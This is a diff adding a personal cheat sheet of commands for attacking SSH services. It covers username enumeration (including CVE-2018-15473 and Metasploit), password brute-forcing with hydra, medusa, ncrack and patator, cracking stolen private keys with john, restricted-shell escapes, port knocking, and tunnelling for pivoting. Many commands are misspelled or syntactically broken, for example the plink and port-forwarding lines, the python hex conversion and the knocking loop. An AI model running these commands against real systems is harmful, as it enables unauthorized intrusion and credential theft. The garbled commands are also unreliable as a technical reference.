@@ -1,0 +1,121 @@
+ssh 22
+
+nmap -sV --script="ssh* and not brute" -p 22 x.x.x.x  -oN ssh_script_scan.nmap
+
+python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/unix_user.txt x.x.x.x
+
+metasploit : - 
+
+use auxilary/scanner/ssh/ssh_enumusers
+  set rhosts x.x.x.x
+  set user_file /usr/share/wordlists/metasploit/unix_users.txt
+  run 
+  
+banner grabbing : -
+nmap -sV -p -T:22 x.x.x.x
+
+connect to ssh : - 
+ssh admin@x.x.x.x
+ssh -i key admin@x.x.x.x
+
+bruteforcing : - 
+patatr ssh_login host=x.x.x.x user=users.txt 0=users.txt password=passwords.txt 1=passwords.txt
+hydra -l admin -v -V -P passwords.txt x.x.x.x ssh
+hydra -L users.txt -P passwords.txt x.x.x.x ssh
+hydra -L users.txt -p passwords.txt -f -u x.x.x.x
+medusa -h x.x.x.x -U users.txt -P passwords.txt -M ssh
+ncrack -v -U users.txt -P passwords.txt x.x.x.x:22
+
+nmap -p 22 -script ssh-brute -script-args userdb=users.lst,passdb=pass.lst -script-args ssh-brute.timeout=4s x.x.x.x
+
+ssh tunnenling pivoting : - 
+sshuttle -vvr user@x.x.x.x
+
+local port fordwarding : - 
+ssh <gateway> -L <local port to listner>:<remote host>:<remote port>
+
+Dynamic port fordearding : - 
+ssh -D <local proxy port> -p <remote port> <target>
+
+remote port fordwarding : - 
+ssh <gateway> -R <remote port to bind>:<localhost>:<local port>
+
+plink local port forwarding : - 
+plink -l root -pw pass -R 3389:<localhost>:3389<remote host>
+
+ssh user@<rhost> -oKexAlgarithms=tdiffie-hellman-group1-sha1
+
+ssh -R 8080:<lhost>:80<rhot>
+ssh -L 8000:127.0.0.1:8000<username>@<rhost>
+ssh -N -L 1234:127.0.0.1:1234<username>@<rhost>
+
+ssh -L 80:<lhost>:80<rhost>
+ssh -L 127.0.0.1:<lhost>:80<rhost>
+ssh -L 80:localhost:80:<rhost>
+
+rbash shell esacping : - 
+ssh <user>@x.x.x.x 'bash --no-profile'
+export PATH=/bin:/sbin:/user/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:$PATH
+ls
+-rbash:/usr/bin/python:restricted:cannot speoipy'/'  
+
+in command names : - 
+
+$ Bash_CMD[a]=/bin/sh;a
+$ export PATH=$PATH:/bin/
+$ export PATH=$PATH:/usr/bin
+
+login with rsa : - 
+chmod 400 id_Rsa
+chmod 600 id_Rsa
+ssh -i id_Rsa hype@x.x.x.x
+ssh admin@x.x.x.x -i id_Rsa
+ssh -o StrictHostKeyChecking=no -i id_Rsa root@x.x.x.x
+
+Decrypt rsa : - 
+
+python ssh2john.py id_rsa > hash
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+decrypt rsa ofr giver (p,q,e and ct) (cyphertext)
+
+rsadecrypt.py 
+result - plain text(long number)
+
+convert pt to hex : - 
+python -C "print([PT,'x').decode("hex")"
+
+whan bruteforcing hydra does not work then try patatar
+
+patatar ssh_login host=x.x.x.x
+
+lsshell bypass : - 
+echo os.system('/bin/bash')
+
+port knocking : - 
+crunch 3 3 -p 'o "7" "2350" 43' > knock.txt IFS=$'\n';for i in $(Cat knock.txt); echo knock $ i -d 500; done 
+
+path of id_rsa :-
+$ /usr/.ssh/id_rsa
+$ /usr/.ssh/authorized_key
+
+configurations files : -
+
+ssh_config
+sshd_config
+authorized_keys
+ssh_know_hosts
+.shots
+
+exploitations :-
+gather version number
+searchsploit
+default creds
+vreds priviously gatherd
+download the software
+
+OpenSSH 2.3<7.7 - Username enumeration
+cve-2018-15473
+
+python openssh_username_enum.py --port 22 --userlist ssh_list.txt --outputfile ssh_enum_results.txt x.x.x.x
+
